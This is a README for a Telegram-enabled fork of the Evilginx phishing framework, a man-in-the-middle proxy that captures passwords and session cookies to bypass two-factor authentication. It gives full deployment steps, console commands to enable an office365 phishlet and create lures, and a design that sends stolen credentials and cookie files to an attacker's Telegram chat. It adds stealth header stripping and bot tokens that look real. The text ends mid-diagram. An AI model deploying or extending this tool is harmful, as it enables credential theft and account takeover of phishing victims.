<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                      🦊  E V I L G I N X 3                                ║
║                     T E L E G R A M   E D I T I O N                       ║
║                                                                            ║
║         Man-in-the-Middle Attack Framework with 2FA Bypass                ║
║                  & Real-Time Telegram Alerts                               ║
║                                                                            ║
║                  Created with ❤️ by @officialmonsterz                      ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png"
       alt="Evilginx2 Logo"
       width="180"
       style="filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));">
</p>

<h1 align="center" style="font-family: 'Courier New', monospace; font-size: 2.5em; color: #ff6b35; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
  🦊 Evilginx3 — Telegram Edition
</h1>

<p align="center" style="font-size: 1.15em; font-weight: 500; color: #555;">
  <strong>
    Man-in-the-Middle Attack Framework with 2FA Bypass<br>
    & Real-Time Telegram Alerts
  </strong>
</p>

<br>

<p align="center">
  <a href="https://t.me/officialmonsterz">
    <img src="https://img.shields.io/badge/Telegram-@officialmonsterz-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
  </a>
  <a href="mailto:shapads@tutamail.com">
    <img src="https://img.shields.io/badge/Email-shapads@tutamail.com-red?style=for-the-badge&logo=mail.ru&logoColor=white" alt="Email">
  </a>
  <a href="https://github.com/officialmonsterz/evilginx2">
    <img src="https://img.shields.io/badge/GitHub-officialmonsterz-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
  </a>
</p>

<p align="center">
  <a href="https://github.com/officialmonsterz/evilginx2/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203--Clause-blue?style=flat-square" alt="License">
  </a>
  <img src="https://img.shields.io/badge/Version-3.3.0-brightgreen?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.22-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Database-BuntDB-orange?style=flat-square" alt="BuntDB">
  <img src="https://img.shields.io/badge/Docker-~18MB-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
</p>

<br>

---

<br>

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png"
       alt="Evilginx2 Console"
       width="780"
       style="border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.25);">
</p>

<br>

---

<br>

# 📋 Table of Contents

- [🧠 What Is Evilginx3?](#-what-is-evilginx3)
- [⚡ Why This Fork?](#-why-this-fork)
- [📊 Original vs This Fork — Full Comparison](#-original-vs-this-fork--full-comparison)
- [✨ New Features Deep Dive](#-new-features-deep-dive)
- [🚀 Quick Start](#-quick-start)
- [📱 Telegram Integration](#-telegram-integration)
- [📊 Web Dashboard](#-web-dashboard)
- [🐳 Docker Support](#-docker-support)
- [🧬 Architecture & Data Flow](#-architecture--data-flow)
- [📂 Repository File Structure](#-repository-file-structure)
- [🖼️ Screenshots](#-screenshots)
- [⚖️ Disclaimer](#-disclaimer)
- [👏 Credits & Support](#-credits--support)

<br>

---

<br>

# 🧠 What Is Evilginx3?

> **Evilginx3** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing **2-factor authentication protection**.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality. The present version is fully written in **Go** as a standalone application, implementing its own HTTP and DNS server, making it extremely easy to set up and use.

<br>

## 🎯 How It Works — The Big Picture

┌─────────────────────────────────────┐
                      │         VICTIM'S BROWSER            │
                      │  (thinks they're on the real site)  │
                      └──────────────┬──────────────────────┘
                                     │
                                     ▼
                      ┌─────────────────────────────────────┐
                      │         EVILGINX3 PROXY             │
                      │   (MITM Reverse Proxy Engine)       │
                      └──────┬──────────────────┬───────────┘
                             │                  │
                             ▼                  ▼
          ┌────────────────────────┐   ┌────────────────────────┐
          │   CAPTURES & STORES    │   │   FORWARDS TO REAL    │
          │                        │   │       WEBSITE         │
          │  ✓ Username / Email    │   │                        │
          │  ✓ Password            │   │  (login succeeds —    │
          │  ✓ Session Cookies     │   │   victim sees no      │
          │  ✓ 2FA / MFA Tokens    │   │   suspicious error)   │
          │  ✓ OAuth Bearer Tokens │   └────────────────────────┘
          └───────────┬────────────┘
                      │
                      ▼
 ┌─────────────────────────────────────────────────────────────┐
 │                    DELIVERY CHANNELS                        │
 │                                                             │
 │  ┌─────────────────────┐   ┌─────────────────────────────┐  │
 │  │   📱 TELEGRAM       │   │   📊 WEB DASHBOARD          │  │
 │  │                     │   │                              │  │
 │  │  • Instant alert    │   │  • View all sessions        │  │
 │  │  • Credentials      │   │  • Search & filter          │  │
 │  │  • Token .txt file  │   │  • Export CSV/JSON          │  │
 │  │  • Auto-updates     │   │  • Delete sessions          │  │
 │  └─────────────────────┘   │  • Dark mode UI             │  │
 │                            └─────────────────────────────┘  │
 │  ┌─────────────────────┐   ┌─────────────────────────────┐  │
 │  │   💾 BUNTDB         │   │   📁 AUTO-EXPORT            │  │
 │  │                     │   │                              │  │
 │  │  • Embedded DB      │   │  • JSON files per session   │  │
 │  │  • Zero config      │   │  • CSV for reporting        │  │
 │  │  • No SQL needed    │   │  • Appends to master file   │  │
 │  └─────────────────────┘   └─────────────────────────────┘  │
 └─────────────────────────────────────────────────────────────┘


 <br>

---

<br>

# ⚡ Why This Fork?

This fork by **[@officialmonsterz](https://t.me/officialmonsterz)** takes the already powerful Evilginx3 and supercharges it with **features that penetration testers actually need in real engagements**.

> The original Evilginx3 is a phenomenal framework — powerful, elegant, and battle-tested. But when you're running a real red team operation, you don't have time to constantly refresh a terminal window or SSH into a server to check if you've caught a session. **You need results delivered to you instantly, wherever you are.**

<br>

## 💥 What Makes This Fork Different?

| Aspect | Original Evilginx3 | This Fork (Telegram Edition) |
|:-------|:------------------:|:----------------------------:|
| **📱 Notifications** | ❌ None — must manually check CLI | ✅ **Real-time Telegram alerts** with captured credentials |
| **📎 Token Delivery** | ❌ No file export | ✅ **Tokens attached as `.txt` files** in Telegram messages |
| **🔄 Message Updates** | ❌ N/A | ✅ **Auto-edits existing message** if more tokens arrive (no duplicates) |
| **📊 Web Dashboard** | ❌ CLI only | ✅ **Full web UI** at port 5000 with search, filter, export & dark mode |
| **⏳ Async Processing** | ❌ Blocking operations | ✅ **Non-blocking notification queue** (buffered channel pattern) |
| **💾 Database** | ❌ Plain text logs | ✅ **BuntDB embedded database** — zero config, no SQL needed |
| **🐳 Docker Build** | ❌ Single-stage, large image | ✅ **Multi-stage Alpine build** — only ~18MB final image |
| **📤 Session Export** | ❌ Manual | ✅ **CSV/JSON export** for reporting |
| **🗑️ Session Management** | ❌ No delete/cleanup | ✅ **Delete sessions** from dashboard or API |
| **🔧 Port Conflict Fix** | ❌ Must manually troubleshoot | ✅ **Documented resolution** for `systemd-resolved` conflicts |
| **📁 Auto-Export** | ❌ Not available | ✅ **Auto-save every session** to JSON or CSV files on disk |
| **📋 Header Stripping** | ❌ Headers reveal Evilginx | ✅ **Strip artifact headers** for stealthier operation |

<br>

---

<br>

# 📊 Original vs This Fork — Full Comparison

### FEATURE COMPARISON MATRIX

| FEATURE                                      | ORIGINAL EVILGINX3       | THIS FORK (TELEGRAM EDITION)                          |
|----------------------------------------------|--------------------------|-------------------------------------------------------|
| **MITM Proxy Engine**                        | ✅ Same                  | ✅ Same (enhanced with TG hooks)                      |
| **SSL / Autocert (Let's Encrypt)**           | ✅ Same                  | ✅ Same                                               |
| **Phishlet System (YAML-based templates)**   | ✅ Same                  | ✅ Same                                               |
| **DNS Server (built-in)**                    | ✅ Same                  | ✅ Same                                               |
| **Nameserver / Blacklist**                   | ✅ Same                  | ✅ Same                                               |
|                                              |                          |                                                       |
| **📱 Telegram Notifications**                | ❌ Not available         | ✅ **NEW** — Real-time alerts on every capture        |
| **📎 Token .txt File Attachments**           | ❌ Not available         | ✅ **NEW** — Session cookies as downloadable files    |
| **🔄 Auto-Updating Messages**                | ❌ Not available         | ✅ **NEW** — Edits existing message (no spam)         |
| **⏳ Async Notification Queue**              | ❌ Not available         | ✅ **NEW** — Non-blocking buffered channel            |
| **📊 Web Dashboard (Port 5000)**             | ❌ Not available         | ✅ **NEW** — Full HTML UI with REST API               |
| **💾 BuntDB Embedded Database**              | ❌ Not available         | ✅ **NEW** — Zero-config, file-based, no dependencies |
| **📤 CSV / JSON Export**                     | ❌ Not available         | ✅ **NEW** — One-click export for reporting           |
| **🔍 Session Search & Filter**               | ❌ Not available         | ✅ **NEW** — Search by any field                      |
| **🌙 Dark Mode UI**                          | ❌ Not available         | ✅ **NEW** — Toggleable dark/light mode               |
| **🔐 Dashboard Basic Auth**                  | ❌ Not available         | ✅ **NEW** — Username/password protection             |
| **🐳 Multi-Stage Docker (18MB Alpine)**      | ❌ Single-stage          | ✅ **NEW** — Minimal image, production-ready          |
| **📁 Auto-Export to File**                   | ❌ Not available         | ✅ **NEW** — Auto-save every session                  |
| **📋 Stealth Header Stripping**              | ❌ Not available         | ✅ **NEW** — Remove Evilginx artifact headers         |
| **🧹 Session Deletion (Dashboard + API)**    | ❌ Not available         | ✅ **NEW** — Delete from UI or REST API               |


<br>

## 🎯 Why You Should Use This Fork

> **"The difference between a good tool and a great tool is how it fits into your workflow."**

| Reason | What It Means For You |
|:-------|:----------------------|
| 🚀 **Instant Results** | Credentials hit your Telegram **within seconds** of capture — no more refreshing CLI or SSH'ing into servers |
| 📎 **Portable Tokens** | Tokens are saved as `.txt` files that you can import into **any browser** with EditThisCookie — ready to use |
| 🔄 **No Notification Spam** | If more tokens are captured, the **same Telegram message is updated** — not a new message flooding your chat |
| 📊 **Professional Reporting** | Export sessions as CSV/JSON for your penetration test reports — documentation-ready |
| 🛡️ **Built for Red Teams** | Dashboard + Telegram = monitor multiple campaigns from anywhere in the world |
| 🐳 **Deploy Anywhere** | Docker image works on any Linux server in seconds — AWS, DigitalOcean, Hetzner, anything |
| 🔧 **Zero Extra Config** | No MySQL, no Redis, no Nginx, no Node.js — just **one binary** and it runs |
| 💾 **Persistence Built In** | BuntDB stores everything in a single file — no external database server needed |

<br>

---

<br>

# ✨ New Features Deep Dive

Let me walk you through every new feature in detail, with architecture diagrams and code-level explanations.

<br>

## 📱 1. Telegram Notifications — The Core Feature

This is the flagship feature of this fork. When a victim submits credentials on your phishing page, you get an **instant Telegram message** with all the details.

### What Your Telegram Message Looks Like

┌────────────────────────────────────────────────────────────────────┐
│                                                                    │
│                     ✨ Session Information ✨                       │
│                                                                    │
│ 👤 Username: victim@company.com                                    │
│ 🔑 Password: SuperSecret123!                                       │
│ 🌐 Landing URL: https://login.yourdomain.com/abc123                │
│ 🖥️ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...       │
│ 🌍 Remote Address: 203.0.113.42                                    │
│ 🕒 Created: 1780014345                                             │
│                                                                    │
│ 📦 Tokens are attached as a separate file.                         │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘

### How It Works Internally

┌──────────────────────────┐
              │  SESSION CAPTURED        │
              │  (credentials + tokens)  │
              └────────────┬─────────────┘
                           │
                           ▼
              ┌──────────────────────────┐
              │  ENQUEUE TELEGRAM JOB    │
              │  (async, non-blocking)   │
              │  core/telegram_queue.go  │
              │  buffer: 100 jobs        │
              └────────────┬─────────────┘
                           │
                           ▼
              ┌──────────────────────────┐
              │  PROCESS TELEGRAM JOB    │
              │  core/notify.go          │
              └────────────┬─────────────┘
                           │
                ┌──────────┴──────────┐
                ▼                     ▼
      ┌──────────────────┐  ┌──────────────────┐
      │ FIRST TIME       │  │ SUBSEQUENT       │
      │ CAPTURE?         │  │ CAPTURE?         │
      └───────┬──────────┘  └───────┬──────────┘
              │ YES                 │ YES
              ▼                     ▼


### Telegram Session Update Flow

| **Initial Setup**                                      | **Update Process**                                      |
|--------------------------------------------------------|---------------------------------------------------------|
| 1. Create .txt file<br>with session tokens             | 1. Create updated .txt file                             |
| 2. Format MarkdownV2<br>message                       | 2. Call `editMessageFile`<br>(edits same message)       |
| 3. Send via Telegram<br>API (document msg)            | 3. No new notification<br>in chat — updated<br>existing message |
| 4. Store `message_id`<br>in `sessionMessageMap`       |                                                         |


### Key Files

| File | Purpose |
|:-----|:--------|
| `core/telegram_queue.go` | Async notification queue — buffered channel, processes jobs in background |
| `core/notify.go` | Notification logic — creates `.txt` files, formats messages, sends/edits via API |
| `core/tele.go` | Low-level Telegram API calls — `sendTelegramNotification()`, `editMessageFile()` |
| `core/tsession.go` | `TSession` struct — JSON representation for Telegram communication |

<br>

## 📊 2. Web Dashboard

Access your captured sessions from any browser at `http://YOUR_SERVER_IP:5000`.

### Dashboard Layout

# 🦊 Evilginx2 — Telegram Edition [🌙 Dark Mode]
**by @officialmonsterz** [🔄 Auto-Refresh]


### 🔍 Search
**[Search...]** **[📁 All Phishlets ▼]**

**[📥 Export CSV]** **[📥 Export JSON]** **[🔄 Refresh]**

### Captured Sessions

| # | Phishlet   | Username                | Password      | Remote Address   |
|---|------------|-------------------------|---------------|------------------|
| 1 | office365  | ceo@megacorp.com        | Winter2024!   | 203.0.113.42     |
| 2 | google     | admin@startup.io        | P@ssw0rd      | 198.51.100.7     |
| 3 | linkedin   | hr@company.org          | Recruit123    | 192.0.2.88       |
| 4 | office365  | finance@corp.net        | Q1Report!     | 203.0.113.15     |
| 5 | facebook   | marketing@brand.com     | AdBuget2024   | 198.51.100.33    |

**◀ Previous**  **Page 1 of 5**  **Next ▶**   🟢 **Auto: ON (5s)**

### REST API Endpoints

The dashboard exposes a full REST API for programmatic access:

| Endpoint | Method | Purpose |
|:---------|:-------|:--------|
| `/api/sessions` | `GET` | List sessions (`?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
| `/api/sessions/export` | `GET` | Export all sessions (`?format=csv` or `?format=json`) |
| `/api/sessions/{id}` | `GET` | Get single session with full details and tokens |
| `/api/sessions/{id}` | `DELETE` | Delete a single session |

### Key File

| File | Purpose |
|:-----|:--------|
| `core/dashboard.go` | HTTP server, HTML template, REST API handlers, basic auth middleware |

<br>

## 💾 3. BuntDB Embedded Database

No more parsing plain text log files. This fork uses **BuntDB** — an embedded, zero-configuration key-value database written in Go.

### Why BuntDB?

# DATABASE COMPARISON

| REQUIREMENT          | PLAIN TEXT LOGS     | MySQL/PostgreSQL      | BUNTDB (THIS FORK)          |
|----------------------|---------------------|-----------------------|-----------------------------|
| **Setup Time**       | None                | 30-60 mins            | None!                       |
| **External Server**  | No                  | Yes                   | No                          |
| **Dependencies**     | None                | Many                  | None                        |
| **Query Capability** | grep only           | Full SQL              | JSON indexes                |
| **Backup**           | cp file             | mysqldump             | cp file                     |
| **Memory Footprint** | 0 MB                | 100+ MB               | ~5 MB                       |
| **Crash Recovery**   | Manual              | Complex               | Auto (append-only)          |
| **Concurrent Access**| ❌ No               | ✅ Yes                | ✅ Yes (RWMutex)            |


### Database Schema

```go
type Session struct {
    Id           int                                    // Auto-incremented ID
    Phishlet     string                                 // e.g. "office365"
    LandingURL   string                                 // Lure URL the victim visited
    Username     string                                 // Captured username/email
    Password     string                                 // Captured password
    Custom       map[string]string                      // Custom fields from phishlet
    BodyTokens   map[string]string                      // Tokens from HTTP response body
    HttpTokens   map[string]string                      // Tokens from HTTP headers
    CookieTokens map[string]map[string]*CookieToken     // Session cookies (2FA bypass)
    SessionId    string                                 // UUID
    UserAgent    string                                 // Browser user-agent
    RemoteAddr   string                                 // Victim's IP
    CreateTime   int64                                  // Unix timestamp
    UpdateTime   int64                                  // Last update timestamp
    Cmsgid       string                                 // Telegram credential message ID
    Tmsgid       string                                 // Telegram token message ID
}


Key Files

File	Purpose
database/database.go	BuntDB wrapper — NewDatabase(), helper functions, CRUD dispatch
database/db_session.go	Session struct definition + all CRUD operations (Create, List, Update, Delete)

🐳 4. Multi-Stage Docker Build

This fork includes a production-ready multi-stage Docker build that produces a minimal ~18MB Alpine-based image.
Dockerfile Breakdown

┌─────────────────────────────────────────────────────────────────────────────┐
│                        DOCKER BUILD ARCHITECTURE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STAGE 1: BUILDER                                                          │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │  FROM golang:1.22-alpine                                            │  │
│  │                                                                     │  │
│  │  • Installs: git, ca-certificates, build-base                       │  │
│  │  • Copies go.mod + go.sum → go mod download (cached layer)         │  │
│  │  • Copies source code                                              │  │
│  │  • Builds with: CGO_ENABLED=0, -ldflags="-s -w" (stripped binary)  │  │
│  │  • Output: /build/evilginx (single static binary)                  │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                               │                                            │
│                               ▼                                            │
│  STAGE 2: RUNTIME                                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │  FROM alpine:latest                                                │  │
│  │                                                                     │  │
│  │  • Installs: ca-certificates, tzdata, libcap                       │  │
│  │  • Creates 'evilginx' user (non-root!)                             │  │
│  │  • Copies binary from builder                                      │  │
│  │  • Copies phishlets/ and redirectors/ directories                  │  │
│  │  • Sets cap_net_bind_service=+ep (bind privileged ports <1024)     │  │
│  │  • Runs as non-root 'evilginx' user                                │  │
│  │  • Exposes ports: 53, 80, 443, 5000                                │  │
│  │  • Volume: /home/evilginx/.evilginx (persistent data)              │  │
│  │  • FINAL IMAGE SIZE: ~18MB                                         │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘


Key File

File	Purpose
Dockerfile	Multi-stage build — builder + runtime, ~18MB final image
.dockerignore	Excludes unnecessary files from Docker context

🚀 Quick Start
Prerequisites

    Ubuntu 20.04+ or Debian 11+ VPS (any cloud provider)
    A registered domain (e.g., yourdomain.com)
    A Cloudflare account (free tier)
    A Telegram account

One-Line System Prep

sudo apt update && sudo apt install wget curl git make build-essential nginx certbot python3-certbot-nginx screen fail2ban htop net-tools ufw -y

Step 1: Install Go 1.22.5

cd ~
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version

Expected output: go version go1.22.5 linux/amd64

Step 2: Clone & Build

cd ~
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
go mod tidy
go build -o evilginx2 .
chmod +x evilginx2

Step 3: Configure Firewall

sudo ufw allow 22/tcp
sudo ufw allow 53/udp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 5000/tcp
sudo ufw allow 8080/tcp
sudo ufw --force enable
sudo ufw status

sudo reboot

Step 4: Fix DNS Port Conflict

sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
sudo rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
sudo chattr +i /etc/resolv.conf

Step 5: Run Evilginx3 with Dashboard

./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234

You can change the username and password to whatever you desire above. Just one thing, if nginx is used, you secured, but using it this way, do not let anyone know your vps

Step 6: Basic Configuration (inside : prompt)

: config domain yourdomain.com
: config ipv4 external YOUR_SERVER_IP
: config autocert on
: config unauth_url https://www.google.com
: config teletoken YOUR_BOT_TOKEN
: config chatid YOUR_CHAT_ID

Step 7: Enable a Phishlet

: phishlets hostname office365 yourdomain.com
: phishlets enable office365
: lures create office365
: lures get-url 0


    📘 Full deployment guide available in DEPLOYMENT.md — from zero to production, every step explained in plain English.

📱 Telegram Integration
How to Set Up
Step 1: Create a Telegram Bot

    Open Telegram and search for @BotFather
    Send: /newbot
    Choose a display name (e.g., My Evilginx Notifier)
    Choose a username ending in _bot (e.g., my_evilginx_bot)
    Copy the bot token — looks like: 8863425004:AAF9iutfoUo6dal8-8FgUNgRkIhkPlylAvo

Step 2: Get Your Chat ID

# Message your bot first in Telegram
curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
Your chat ID will be in the response: "chat":{"id":7545457639,...}
OR

Search for your bot on Telegram: @YourBotName_bot
Send any message to it (e.g., "Hello")
Run this command (uses the same token):

curl -s "https://api.telegram.org/bot8863425004:AAF7mZJGUTH6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
Your chat ID will be in the response: "chat":{"id":7545456339,...}

Step 3: Configure in Evilginx Console

: config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
: config chatid 7545457465
: test telegram

Telegram Notification Flow — Detailed Architecture

┌─────────────────────────────────────┐
                    │        HTTP PROXY CAPTURES          │
                    │     Session (credentials + tokens)  │
                    └──────────────┬──────────────────────┘
                                   │
                                   ▼
                    ┌─────────────────────────────────────┐
                    │    core/http_proxy.go               │
                    │                                     │
                    │    1. Extract username/password     │
                    │       from POST body (form/JSON)    │
                    │    2. Intercept Set-Cookie headers  │
                    │    3. Capture body tokens / HTTP    │
                    │       header tokens                 │
                    │    4. Check if all auth tokens      │
                    │       are captured                  │
                    └──────────────┬──────────────────────┘
                                   │
                                   ▼
                    ┌─────────────────────────────────────┐
                    │    Session Complete?                │
                    │                                     │
                    │    YES ──────────────────────────┐  │
                    │                                   │  │
                    │                                   ▼  │
                    │                     ┌─────────────────┴──────┐
                    │                     │ Save to BuntDB        │
                    │                     │ database/db_session.go│
                    │                     └─────────────────┬──────┘
                    │                                       │
                    │                                       ▼
                    │                     ┌──────────────────────────────┐
                    │                     │ Enqueue TelegramJob         │
                    │                     │ core/telegram_queue.go      │
                    │                     │                             │
                    │                     │ jobs <- TelegramJob{        │
                    │                     │   Session, ChatID, BotToken │
                    │                     │ }                           │
                    │                     └──────────────────────────────┘
                    │                                       │
                    │                                       ▼
                    │                     ┌──────────────────────────────────┐
                    │                     │ PROCESS JOB (async goroutine)   │
                    │                     │ core/notify.go → Notify()       │
                    │                     └────────────────┬─────────────────┘
                    │                                      │
                    │                           ┌──────────┴──────────┐
                    │                           ▼                     ▼
                    │                 ┌─────────────────┐  ┌─────────────────┐
                    │                 │ First capture?  │  │ Already seen?   │
                    │                 │ (check          │  │ (check          │
                    │                 │ processedSess-  │  │ processedSess-  │
                    │                 │ ions map)       │  │ ions map)       │
                    │                 └────────┬────────┘  └────────┬────────┘
                    │                         │ YES                │ YES
                    │                         ▼                    ▼
                    │              ┌────────────────────┐  ┌────────────────────┐
                    │              │ 1. Create .txt     │  │ 1. Create .txt     │
                    │              │    file from        │  │    from session    │
                    │              │    session.Tokens   │  │ 2. Look up message │
                    │              │ 2. Format message   │  │    ID from         │
                    │              │    via formatSession│  │    sessionMessage- │
                    │              │    Message()        │  │    Map             │
                    │              │ 3. Call             │  │ 3. Call            │
                    │              │    sendTelegramNot- │  │    editMessageFile │
                    │              │    ification()      │  │    (edits existing)│
                    │              │ 4. Store message_id │  │ 4. No new message  │
                    │              │    in sessionMessage│  │    in Telegram     │
                    │              │    Map              │  │                    │
                    │              └────────────────────┘  └────────────────────┘
                    │
                    │  NO ─────────┘
                    ▼
          ┌─────────────────────┐
          │ Continue proxying   │
          │ (victim sees        │
          │  real website)      │
          └─────────────────────┘


Telegram Feature Details

Feature	Behavior
First Capture	Sends a new message with credentials + token .txt attachment
Subsequent Captures	Edits the same message — no duplicate notifications in chat
Token File	.txt file with formatted JSON cookies, compatible with EditThisCookie / cookie import tools
Async Delivery	Notification queue processes in background via buffered channel — never blocks the proxy
Message Format	MarkdownV2 formatted with escaped special characters via telegram_escape.go


📊 Web Dashboard
Accessing the Dashboard

Open your browser and visit:

http://YOUR_SERVER_IP:5000

Login with the credentials you set via -dashboard-user and -dashboard-pass flags.

Dashboard Feature Map

┌─────────────────────────────────────────────────────────────────────────────┐
│                        DASHBOARD FEATURE MAP                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  📊 STATISTICS BAR                                                  │   │
│  │  Total Sessions | Unique Phishlets | Displayed Count                │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  🔍 SEARCH & FILTER                                               │   │
│  │  • Search box: filters by username, password, phishlet, IP         │   │
│  │  • Dropdown: filter by specific phishlet                           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  📤 EXPORT BUTTONS                                                │   │
│  │  [Export CSV] → Downloads all sessions as CSV                     │   │
│  │  [Export JSON] → Downloads all sessions as JSON                   │   │
│  │  [Refresh] → Manual refresh                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  📋 SESSION TABLE                                                 │   │
│  │  ┌──────┬─────────────┬───────────────────┬──────────┬──────────┐  │   │
│  │  │  #   │  Phishlet   │  Username         │ Password │ IP       │  │   │
│  │  ├──────┼─────────────┼───────────────────┼──────────┼──────────┤  │   │
│  │  │  1   │  office365  │  user@corp.com    │ Pass123! │203.0.113│  │   │
│  │  │  2   │  google     │  admin@test.co    │ Secret99 │198.51.10│  │   │
│  │  │ ...  │  ...        │  ...              │ ...      │ ...      │  │   │
│  │  └──────┴─────────────┴───────────────────┴──────────┴──────────┘  │   │
│  │  Click any row to view full session details + tokens               │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  🌙 DARK MODE TOGGLE                                              │   │
│  │  [Dark Mode] / [Light Mode] — persistent via localStorage          │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  🔄 AUTO-REFRESH                                                  │   │
│  │  • Auto-refreshes every 5 seconds                                  │   │
│  │  • Pauses when browser tab is hidden (visibility API)              │   │
│  │  • Resumes when tab becomes active again                           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘


Dashboard API Examples

# List all sessions
curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions"

# Search sessions
curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions?search=admin"

# Filter by phishlet
curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions?phishlet=office365"

# Export CSV
curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions/export?format=csv" -o sessions.csv

# Export JSON
curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions/export?format=json" -o sessions.json

# Delete a session
curl -u admin:mypass1234 -X DELETE "http://YOUR_SERVER_IP:5000/api/sessions/1"


🐳 Docker Support
Build & Run

# Build the image
docker build -t evilginx2-telegram .

# Run the container
docker run -d \
  --name evilginx2 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx2-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass mypass1234

Docker Compose

version: '3.8'
services:
  evilginx2:
    build: .
    container_name: evilginx2
    restart: unless-stopped
    ports:
      - "53:53/udp"
      - "80:80"
      - "443:443"
      - "5000:5000"
    volumes:
      - evilginx-data:/home/evilginx/.evilginx
    command: >
      -dashboard 0.0.0.0:5000
      -dashboard-user admin
      -dashboard-pass mypass1234

volumes:
  evilginx-data:

🧬 Architecture & Data Flow
Complete System Architecture

┌──────────────────────────────┐
                               │          MAIN.GO             │
                               │  Entry Point + Flag Parser   │
                               └────┬──────┬──────┬──────┬────┘
                                    │      │      │      │
                    ┌───────────────┘      │      │      └───────────────┐
                    ▼                      ▼      ▼                      ▼
       ┌────────────────────┐   ┌──────────────────┐   ┌────────────────────┐
       │   NAMESERVER       │   │   CERTDB         │   │   HTTP PROXY       │
       │   (DNS Server)     │   │   (SSL Certs)    │   │   (MITM Engine)    │
       │   core/nameserver  │   │   core/certdb    │   │   core/http_proxy  │
       │   .go              │   │   .go            │   │   .go              │
       └────────────────────┘   └──────────────────┘   └────────┬───────────┘
                                                                │
                                          ┌─────────────────────┼─────────────────────┐
                                          ▼                     ▼                     ▼
                               ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
                               │   TELEGRAM QUEUE  │  │   DASHBOARD     │  │   BUNTDB DB      │
                               │   (Async Notif)   │  │   (Web UI)      │  │   (Storage)      │
                               │   core/telegram_  │  │   core/         │  │   database/      │
                               │   queue.go        │  │   dashboard.go  │  │   database.go    │
                               └────────┬─────────┘  └──────────────────┘  └──────────────────┘
                                        │
                                        ▼
                               ┌──────────────────┐
                               │   NOTIFY + TELE   │
                               │   (TG API Calls)  │
                               │   core/notify.go  │
                               │   core/tele.go    │
                               └──────────────────┘

Complete Data Flow — From Capture to Delivery

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                          THE COMPLETE JOURNEY OF A CAPTURED SESSION                                │
├─────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                     │
│  PHASE 1: VICTIM INTERACTS                                                                          │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  Victim opens phishing URL → Browser loads proxied page → Victim enters credentials → Submit │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 2: PROXY CAPTURES                                                                            │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  http_proxy.go intercepts the POST request                                                    │ │
